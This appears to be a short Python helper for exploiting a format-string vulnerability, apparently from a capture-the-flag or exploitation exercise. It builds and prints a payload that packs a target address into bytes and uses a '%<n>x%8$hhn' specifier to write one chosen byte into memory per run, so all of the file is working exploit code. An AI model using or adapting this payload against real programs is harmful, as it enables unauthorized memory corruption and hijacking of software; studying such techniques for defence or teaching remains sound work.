import sys
input_address = str(sys.argv[1])
tweet_number = int(sys.argv[2])
write_hex = str(sys.argv[3])
x = '0x' + input_address[-2:]
input_address = (input_address[:-2] + str(hex((int(x, 16) + tweet_number)))[2:])[2:]
input_address += '00000000'[:-len(input_address)]
str_value = ''
prom = [input_address[i-2:i] for i in range(8, 0, -2)]
for index in prom:
    str_value += chr(int(index, 16))
prom = [write_hex[i:i+2] for i in range(0, int(len(write_hex)), 2)]
int_value = str(int('0x'+prom[tweet_number], 16) - 5 + 256)
sys.stdout.write('\x31' + str_value + '%' + int_value + 'x%8$hhn')
